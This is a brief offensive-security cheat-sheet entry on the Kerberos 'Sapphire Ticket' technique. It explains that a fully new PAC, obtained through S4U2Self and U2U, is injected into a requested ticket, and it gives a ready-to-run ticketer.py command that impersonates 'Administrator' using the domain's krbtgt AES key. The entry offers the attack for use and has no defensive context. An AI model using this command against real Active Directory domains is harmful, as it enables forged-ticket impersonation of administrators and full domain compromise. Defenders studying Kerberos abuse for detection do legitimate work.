# Sapphire Ticket

Similar to Diamond Ticket, but instead of decipher, modify, recipher and resign the PAC on the fly, this technique inject a fully new one PAC obtained via a S4USelf + U2U attack in the requested ticket.

    ticketer.py -request -impersonate 'Administrator' -domain 'domain.local' -user 'user1' -password 'password' -aesKey 'krbtgt_AES_key' -domain-sid '<domain_SID>' 'blabla'
